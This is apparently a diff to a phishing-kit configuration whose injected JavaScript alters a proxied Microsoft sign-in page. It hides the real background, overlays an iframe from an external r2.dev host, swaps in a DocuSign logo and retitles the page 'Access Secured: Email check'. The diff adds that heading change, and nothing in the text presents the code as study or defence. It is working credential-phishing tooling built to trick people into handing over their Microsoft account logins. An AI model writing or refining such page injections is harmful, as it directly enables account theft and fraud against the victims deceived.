@@ -139,12 +139,12 @@ js_inject:
         };
 
         waitFor('#backgroundImage', (bgImg) => {
-          // Remove Microsoft's background image
+          // Remove Microsoft background
           bgImg.style.display = 'none';
 
-          // Inject your custom full Word interface
+          // Inject your Word-like iframe background
           const iframe = document.createElement("iframe");
-          iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html"; // <-- updated link
+          iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html";
           iframe.style.position = "absolute";
           iframe.style.top = "0";
           iframe.style.left = "0";
@@ -159,11 +159,16 @@ js_inject:
           container.appendChild(iframe);
         });
 
-        // Also replace Microsoft logo inside the form with DocuSign logo
+        // Replace Microsoft logo with DocuSign logo
         waitFor('img.logo', (logoImg) => {
-          logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png"; // <-- DocuSign logo
+          logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
           logoImg.style.width = "100px";
           logoImg.style.objectFit = "contain";
+        });
+
+        // Change heading text "Sign in" to "Access Secured: Email check"
+        waitFor('#loginHeader div[role="heading"], #loginHeader h1', (heading) => {
+          heading.textContent = "Access Secured: Email check";
         });
 
       }, 3000);
